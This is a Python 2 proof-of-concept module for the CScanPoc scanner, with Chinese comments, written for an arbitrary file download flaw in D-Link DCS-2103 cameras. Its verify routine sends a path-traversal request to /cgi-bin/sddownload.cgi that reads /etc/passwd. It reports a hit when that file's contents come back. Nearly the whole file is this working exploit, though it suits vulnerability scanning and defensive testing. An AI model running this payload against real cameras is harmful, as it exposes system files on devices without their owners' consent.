# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'D-Link_0000' # 平台漏洞编号，留空
    name = 'D-Link DCS-2103 /cgi-bin/sddownload.cgi 任意文件下载漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        D-Link DCS-2103 /cgi-bin/sddownload.cgi 任意文件下载漏洞
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DCS-2103'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd1ddb02e-bb2c-4db7-b2ee-81e68e67b6ca'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/cgi-bin/sddownload.cgi?file=/../../etc/passwd'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if 'root:' in content and 'nobody:' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()